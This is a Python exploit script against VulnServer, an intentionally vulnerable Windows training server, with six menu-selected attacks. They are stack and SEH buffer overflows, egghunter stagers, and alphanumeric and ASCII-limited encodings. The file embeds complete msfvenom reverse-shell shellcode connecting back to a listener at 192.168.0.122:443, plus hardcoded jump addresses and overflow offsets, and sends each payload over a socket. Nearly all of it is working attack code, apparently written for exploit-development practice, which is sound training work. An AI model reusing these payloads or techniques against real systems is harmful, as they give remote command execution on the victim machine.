#!/usr/bin/python3

# VulnServer Exploits
# William Moody
# 28.06.2021

import sys
import socket
from struct import pack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 9999

# ===

print("=-=-=-=-=-=-=-=-=-=")
print("VulnServer exploits")
print(" bmdyy, 28.06.2021")
print("=-=-=-=-=-=-=-=-=-=")
print()
print("[1] TRUN  :: Stack Overflow")
print("[2] GMON  :: SEH Overflow + Egghunter")
print("[3] KSTET :: Stack Overflow + Egghunter")
print("[4] GTER  :: Stack Overflow + Egghunter")
print("[5] HTER  :: Stack Overflow + Alphanumeric Encoding")
print("[6] LTER  :: Stack Overflow + ASCII Limit")
print()

method = int(input("> "))
print()

# ===
# For all exploits except LTER, you can use this shellcode:
#   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.122 LPORT=443 -b "\x00" -f python -v shell

shell =  b"\x90" * 20
shell += b"\xb8\x64\xb1\x28\xba\xdb\xc2\xd9\x74\x24\xf4\x5b"
shell += b"\x29\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x27"
shell += b"\xbf\xca\x4f\x5b\x57\x88\xb0\xa3\xa8\xed\x39\x46"
shell += b"\x99\x2d\x5d\x03\x8a\x9d\x15\x41\x27\x55\x7b\x71"
shell += b"\xbc\x1b\x54\x76\x75\x91\x82\xb9\x86\x8a\xf7\xd8"
shell += b"\x04\xd1\x2b\x3a\x34\x1a\x3e\x3b\x71\x47\xb3\x69"
shell += b"\x2a\x03\x66\x9d\x5f\x59\xbb\x16\x13\x4f\xbb\xcb"
shell += b"\xe4\x6e\xea\x5a\x7e\x29\x2c\x5d\x53\x41\x65\x45"
shell += b"\xb0\x6c\x3f\xfe\x02\x1a\xbe\xd6\x5a\xe3\x6d\x17"
shell += b"\x53\x16\x6f\x50\x54\xc9\x1a\xa8\xa6\x74\x1d\x6f"
shell += b"\xd4\xa2\xa8\x6b\x7e\x20\x0a\x57\x7e\xe5\xcd\x1c"
shell += b"\x8c\x42\x99\x7a\x91\x55\x4e\xf1\xad\xde\x71\xd5"
shell += b"\x27\xa4\x55\xf1\x6c\x7e\xf7\xa0\xc8\xd1\x08\xb2"
shell += b"\xb2\x8e\xac\xb9\x5f\xda\xdc\xe0\x37\x2f\xed\x1a"
shell += b"\xc8\x27\x66\x69\xfa\xe8\xdc\xe5\xb6\x61\xfb\xf2"
shell += b"\xb9\x5b\xbb\x6c\x44\x64\xbc\xa5\x83\x30\xec\xdd"
shell += b"\x22\x39\x67\x1d\xca\xec\x28\x4d\x64\x5f\x89\x3d"
shell += b"\xc4\x0f\x61\x57\xcb\x70\x91\x58\x01\x19\x38\xa3"
shell += b"\xc2\xe6\x15\xab\x68\x8f\x67\xab\x8d\xf4\xe1\x4d"
shell += b"\xe7\x1a\xa4\xc6\x90\x83\xed\x9c\x01\x4b\x38\xd9"
shell += b"\x02\xc7\xcf\x1e\xcc\x20\xa5\x0c\xb9\xc0\xf0\x6e"
shell += b"\x6c\xde\x2e\x06\xf2\x4d\xb5\xd6\x7d\x6e\x62\x81"
shell += b"\x2a\x40\x7b\x47\xc7\xfb\xd5\x75\x1a\x9d\x1e\x3d"
shell += b"\xc1\x5e\xa0\xbc\x84\xdb\x86\xae\x50\xe3\x82\x9a"
shell += b"\x0c\xb2\x5c\x74\xeb\x6c\x2f\x2e\xa5\xc3\xf9\xa6"
shell += b"\x30\x28\x3a\xb0\x3c\x65\xcc\x5c\x8c\xd0\x89\x63"
shell += b"\x21\xb5\x1d\x1c\x5f\x25\xe1\xf7\xdb\x55\xa8\x55"
shell += b"\x4d\xfe\x75\x0c\xcf\x63\x86\xfb\x0c\x9a\x05\x09"
shell += b"\xed\x59\x15\x78\xe8\x26\x91\x91\x80\x37\x74\x95"
shell += b"\x37\x37\x5d"

# For LTER you can only use chars between 0x01 - 0x7f, and so this one requires a special shellcode:
#   msfvenom -f python -v shell2 LHOST=192.168.0.122 LPORT=443 -p windows/shell_reverse_tcp -b "\x00" -e "x86/alpha_mixed" BufferRegister=ESP

shell2 =  b""
shell2 += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shell2 += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shell2 += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shell2 += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shell2 += b"\x42\x75\x4a\x49\x79\x6c\x79\x78\x6c\x42\x75\x50"
shell2 += b"\x33\x30\x77\x70\x53\x50\x6f\x79\x4b\x55\x44\x71"
shell2 += b"\x59\x50\x30\x64\x4e\x6b\x36\x30\x30\x30\x4c\x4b"
shell2 += b"\x61\x42\x56\x6c\x4c\x4b\x36\x32\x77\x64\x4c\x4b"
shell2 += b"\x44\x32\x67\x58\x64\x4f\x78\x37\x32\x6a\x64\x66"
shell2 += b"\x70\x31\x4b\x4f\x6c\x6c\x47\x4c\x65\x31\x51\x6c"
shell2 += b"\x75\x52\x76\x4c\x37\x50\x5a\x61\x6a\x6f\x66\x6d"
shell2 += b"\x73\x31\x58\x47\x6b\x52\x6c\x32\x56\x32\x63\x67"
shell2 += b"\x4c\x4b\x76\x32\x42\x30\x4c\x4b\x71\x5a\x57\x4c"
shell2 += b"\x6e\x6b\x42\x6c\x56\x71\x33\x48\x48\x63\x61\x58"
shell2 += b"\x65\x51\x38\x51\x32\x71\x6e\x6b\x70\x59\x71\x30"
shell2 += b"\x76\x61\x69\x43\x4c\x4b\x72\x69\x34\x58\x7a\x43"
shell2 += b"\x76\x5a\x42\x69\x4c\x4b\x55\x64\x4e\x6b\x76\x61"
shell2 += b"\x6a\x76\x76\x51\x69\x6f\x6c\x6c\x7a\x61\x58\x4f"
shell2 += b"\x74\x4d\x55\x51\x4f\x37\x74\x78\x69\x70\x34\x35"
shell2 += b"\x78\x76\x57\x73\x43\x4d\x4a\x58\x45\x6b\x61\x6d"
shell2 += b"\x31\x34\x31\x65\x78\x64\x50\x58\x4e\x6b\x42\x78"
shell2 += b"\x57\x54\x36\x61\x58\x53\x43\x56\x4c\x4b\x46\x6c"
shell2 += b"\x32\x6b\x4e\x6b\x43\x68\x35\x4c\x66\x61\x6e\x33"
shell2 += b"\x6c\x4b\x36\x64\x4c\x4b\x43\x31\x6a\x70\x6c\x49"
shell2 += b"\x32\x64\x74\x64\x55\x74\x63\x6b\x51\x4b\x63\x51"
shell2 += b"\x66\x39\x30\x5a\x53\x61\x6b\x4f\x4d\x30\x71\x4f"
shell2 += b"\x73\x6f\x61\x4a\x4c\x4b\x62\x32\x4a\x4b\x4c\x4d"
shell2 += b"\x33\x6d\x51\x78\x77\x43\x74\x72\x45\x50\x57\x70"
shell2 += b"\x51\x78\x74\x37\x70\x73\x36\x52\x33\x6f\x61\x44"
shell2 += b"\x32\x48\x72\x6c\x44\x37\x57\x56\x45\x57\x4b\x4f"
shell2 += b"\x39\x45\x4e\x58\x4a\x30\x75\x51\x67\x70\x35\x50"
shell2 += b"\x67\x59\x69\x54\x71\x44\x50\x50\x32\x48\x46\x49"
shell2 += b"\x4d\x50\x32\x4b\x65\x50\x69\x6f\x79\x45\x46\x30"
shell2 += b"\x50\x50\x30\x50\x62\x70\x31\x50\x36\x30\x71\x50"
shell2 += b"\x52\x70\x63\x58\x79\x7a\x76\x6f\x59\x4f\x4d\x30"
shell2 += b"\x4b\x4f\x49\x45\x4d\x47\x53\x5a\x53\x35\x30\x68"
shell2 += b"\x69\x50\x4c\x68\x47\x70\x73\x4a\x30\x68\x47\x72"
shell2 += b"\x53\x30\x46\x61\x6d\x6b\x6f\x79\x58\x66\x61\x7a"
shell2 += b"\x36\x70\x71\x46\x42\x77\x32\x48\x5a\x39\x6c\x65"
shell2 += b"\x72\x54\x45\x31\x4b\x4f\x79\x45\x6d\x55\x6b\x70"
shell2 += b"\x51\x64\x54\x4c\x59\x6f\x72\x6e\x65\x58\x54\x35"
shell2 += b"\x6a\x4c\x45\x38\x6a\x50\x6e\x55\x59\x32\x63\x66"
shell2 += b"\x69\x6f\x69\x45\x53\x58\x45\x33\x30\x6d\x63\x54"
shell2 += b"\x47\x70\x4d\x59\x59\x73\x72\x77\x61\x47\x61\x47"
shell2 += b"\x55\x61\x7a\x56\x71\x7a\x75\x42\x51\x49\x62\x76"
shell2 += b"\x79\x72\x39\x6d\x53\x56\x6a\x67\x37\x34\x36\x44"
shell2 += b"\x75\x6c\x43\x31\x56\x61\x6e\x6d\x30\x44\x61\x34"
shell2 += b"\x62\x30\x5a\x66\x33\x30\x33\x74\x53\x64\x66\x30"
shell2 += b"\x72\x76\x73\x66\x51\x46\x67\x36\x30\x56\x70\x4e"
shell2 += b"\x32\x76\x42\x76\x73\x63\x71\x46\x50\x68\x51\x69"
shell2 += b"\x5a\x6c\x37\x4f\x4e\x66\x39\x6f\x4e\x35\x6c\x49"
shell2 += b"\x6d\x30\x52\x6e\x50\x56\x33\x76\x59\x6f\x44\x70"
shell2 += b"\x73\x58\x67\x78\x4e\x67\x75\x4d\x75\x30\x39\x6f"
shell2 += b"\x6e\x35\x6f\x4b\x6a\x50\x38\x35\x69\x32\x73\x66"
shell2 += b"\x63\x58\x6f\x56\x6d\x45\x6d\x6d\x4d\x4d\x59\x6f"
shell2 += b"\x5a\x75\x45\x6c\x54\x46\x33\x4c\x37\x7a\x4f\x70"
shell2 += b"\x39\x6b\x6b\x50\x54\x35\x37\x75\x4f\x4b\x62\x67"
shell2 += b"\x72\x33\x54\x32\x62\x4f\x31\x7a\x75\x50\x32\x73"
shell2 += b"\x79\x6f\x39\x45\x41\x41"

# ===
# Syscall Egghunter (tag = w00tw00t)

egghunter  = b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
egghunter += b"\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e"
egghunter += b"\x3c\x05\x5a\x74\xeb\xb8\x77\x30"
egghunter += b"\x30\x74\x89\xd7\xaf\x75\xe6\xaf"
egghunter += b"\x75\xe3\xff\xe7"

# ===

def send(buf):
    print("[+] Sending packet...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.recv(1024) # Header (Welcome to Vuln...)
    s.send(buf)
    s.close()

# ===

buf = None

if method == 1: # TRUN, badchars = \x00
    # This is a simple overflow. We only need
    # to redirect execution to esp

    buf  = b"TRUN ."              # opcode
    buf += b"A" * 2006            # offset
    buf += pack("<I", 0x625011af) # jmp esp
    buf += shell                  # shellcode

elif method == 2: # GMON
    # First we will send the shellcode to be stored
    # somewhere in memory

    buf  = b"TRUN "    # opcode
    buf += b"w00tw00t" # tag
    buf += shell       # shellcode

    send(buf)

    # Next we can send the actual overflow that
    # will call an egghunter to find and execute the 
    # previously sent shellcode

    buf  = b"GMON /"                           # opcode
    buf += b"A" * 3550                         # offset
    buf += b"\x71\x06\x70\x04"                 # short jump
    buf += pack("<I", 0x625011b3)              # pop eax ; pop eax ; ret
    buf += egghunter                           # egghunter
    buf += b"B" * 500                          # extra chars to trigger seh overflow

elif method == 3: # KSTET, badchars = \x00
    # First we will send the shellcode to be stored
    # somewhere in memory

    buf  = b"TRUN "    # opcode
    buf += b"w00tw00t" # tag
    buf += shell       # shellcode

    send(buf)

    # Next we will send the overflow packet.
    # There are only 20 free bytes after eip that
    # we can use, so we will use these to redirect execution
    # into the buffer we have control over and run the egghunter.

    buf  = b"KSTET "                    # offset
    buf += egghunter                    # egghunter
    buf += b"A" * (70 - len(egghunter)) # offset
    buf += pack("<I", 0x625011af)       # jmp esp
    buf += b"\xbb\xfa\xff\xff\xff"      # mov ebx, 0xfffffffa ( 0 - 6 )
    buf += b"\xf7\xdb"                  # neg ebx
    buf += b"\x01\xd8"                  # add eax, ebx
    buf += b"\xff\xe0"                  # jmp eax

elif method == 4: # GTER, badchars = \x00
    # First we will send the shellcode to be stored
    # somewhere in memory

    buf  = b"TRUN "    # opcode
    buf += b"w00tw00t" # tag
    buf += shell       # shellcode

    send(buf)

    # Next we will send the overflow packet.
    # There are only 20 free bytes after eip that
    # we can use, so we will use these to redirect execution
    # into the buffer we have control over and run the egghunter.

    buf  = b"GTER "                      # opcode
    buf += egghunter                     # egghunter
    buf += b"A" * (151 - len(egghunter)) # offset
    buf += pack("<I", 0x625011af)        # jmp esp
    buf += b"\xbb\xfb\xff\xff\xff"       # mov ebx, 0xfffffffb ( 0 - 5 )
    buf += b"\xf7\xdb"                   # neg ebx
    buf += b"\x01\xd8"                   # add eax, ebx
    buf += b"\xff\xe0"                   # jmp eax

elif method == 5: # HTER, badchars = \x00
    # This is a simple stack overflow, but with a twist.
    # The buffer is converted from characters into bytes 
    # and so we need to alphanumerically "encode" the payload.

    buf = b"HTER "                                                          # opcode
    buf += b"a" * 2041                                                      # offset
    buf += b"af115062"                                                      # jmp esp
    buf += "".join(["%.2x" % shell[n] for n in range(len(shell))]).encode() # shell (encoded as chars)

elif method == 6: # LTER, badchars = \x00
    # This is regular stack overflow, except all
    # bytes larger than 0x7f are subtracted by 0x7f

    buf  = b"LTER ."              # opcode
    buf += b"A" * 2006            # offset
    buf += pack("<I", 0x62501205) # jmp esp
    buf += shell2                 # shellcode

else:
    print("[-] Unknown method. Exiting...")
    sys.exit(1)

# ===

# HELP  ... => ...
# STATS ... => ...
# RTIME ... => ...
# LTIME ... => ...
# SRUN  ... => ...
# TRUN  ... => STACK OVERFLOW
# GMON  ... => SEH OVERFLOW
# GDOG  ... => ...
# KSTET ... => STACK OVERFLOW
# GTER  ... => STACK OVERFLOW
# HTER  ... => STACK OVERFLOW
# LTER  ... => STACK OVERFLOW
# KSTAN ... => ...

send(buf)